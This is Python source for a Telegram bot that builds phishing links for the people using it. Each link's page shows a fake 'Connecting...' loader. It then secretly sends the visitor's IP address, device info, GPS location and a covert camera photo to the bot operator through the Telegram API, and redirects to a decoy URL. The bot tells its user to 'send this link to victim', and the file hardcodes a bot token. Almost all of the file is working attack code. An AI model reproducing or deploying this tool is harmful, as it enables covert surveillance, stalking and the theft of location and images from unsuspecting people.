import telebot
import os
import requests
import time

TOKEN = "8754262218:AAEGMkxM2YWo121PjkZMr4MX3Jd9g8cJhQw"  # Apna token yahan dal
bot = telebot.TeleBot(TOKEN)

CHANNEL = "@nrtecno2"

# Store user state
user_state = {}

# Check if user is subscribed to channel
def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={CHANNEL}&user_id={user_id}"
        r = requests.get(url)
        data = r.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "administrator", "creator"]
    except:
        pass
    return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    
    if is_subscribed(user_id):
        bot.reply_to(message, "✅ Send me any URL:\n\nExample:\nhttps://www.instagram.com/p/xxxxx\nhttps://www.instagram.com/reel/xxxxx")
        user_state[user_id] = "waiting_url"
    else:
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2")
        verify = telebot.types.InlineKeyboardButton("✅ Verify", callback_data="verify")
        markup.add(btn)
        markup.add(verify)
        bot.reply_to(message, f"🚫 You must join {CHANNEL} first!\n\n1. Click Join Channel\n2. Join\n3. Click Verify", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    user_id = call.from_user.id
    
    if is_subscribed(user_id):
        bot.edit_message_text("✅ Verified!\n\nSend me any URL:", user_id, call.message.message_id)
        user_state[user_id] = "waiting_url"
    else:
        bot.answer_callback_query(call.id, "❌ Please join channel first!", show_alert=True)

@bot.message_handler(func=lambda m: True)
def handle(message):
    user_id = message.chat.id
    url = message.text.strip()
    
    # Check if user is in waiting state
    if user_state.get(user_id) != "waiting_url":
        bot.reply_to(message, "Use /start first")
        return
    
    # Check if valid URL
    if not (url.startswith("http://") or url.startswith("https://")):
        bot.reply_to(message, "❌ Send valid URL starting with http:// or https://")
        return
    
    # Generate HTML payload with camera, location, IP
    html = f'''<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading</title>
<style>
body{{background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace}}
.loader{{border:3px solid #333;border-top:3px solid #0f0;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
</head>
<body>
<div style="text-align:center">
<div class="loader"></div>
<h2>Connecting...</h2>
</div>
<script>
let TOKEN = "{TOKEN}";
let USER = {user_id};
let TARGET = "{url}";

async function sendMsg(t) {{
    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:USER, text:t}})
    }});
}}

async function getIP() {{
    let r=await fetch('https://api.ipify.org?format=json');
    let d=await r.json();
    return d.ip;
}}

async function getLocation() {{
    return new Promise(r=>{{
        if(navigator.geolocation){{
            navigator.geolocation.getCurrentPosition(
                p=>{{
                    sendMsg('📍 Location: https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude);
                    r();
                }},
                ()=>r()
            );
        }} else r();
    }});
}}

async function takePhoto() {{
    try{{
        let s=await navigator.mediaDevices.getUserMedia({{video:true}});
        let v=document.createElement('video');
        v.srcObject=s;
        await new Promise(r=>{{v.onloadedmetadata=()=>{{v.play();r()}}}});
        await new Promise(r=>setTimeout(r,300));
        let c=document.createElement('canvas');
        c.width=v.videoWidth;
        c.height=v.videoHeight;
        c.getContext('2d').drawImage(v,0,0);
        let b=await new Promise(r=>c.toBlob(r));
        if(b){{
            let fd=new FormData();
            fd.append('chat_id',USER);
            fd.append('photo',b);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{{method:'POST',body:fd}});
        }}
        s.getTracks().forEach(t=>t.stop());
    }} catch(e){{
        sendMsg('❌ Camera access denied or error');
    }}
}}

async function start(){{
    let ip=await getIP();
    let ua=navigator.userAgent;
    await sendMsg('🎯 VICTIM DATA\\nIP: '+ip+'\\nDevice: '+ua.split('(')[0]);
    await getLocation();
    await takePhoto();
    window.location.href=TARGET;
}}
start();
</script>
</body>
</html>'''
    
    # Save HTML file
    filename = f"v_{user_id}.html"
    with open(filename, "w") as f:
        f.write(html)
    
    # Generate link
    link = f"https://telegram-bot-osvi.onrender.com/{filename}"
    
    bot.reply_to(message, f"✅ YOUR LINK:\n{link}\n\nSend this link to victim.\n\nWhen they click, you will get:\n- IP Address\n- Location\n- Camera Photo\n- Device Info\n\nVictim will be redirected to {url}")
    
    # Clear state
    del user_state[user_id]

print("Bot started...")
bot.infinity_polling()
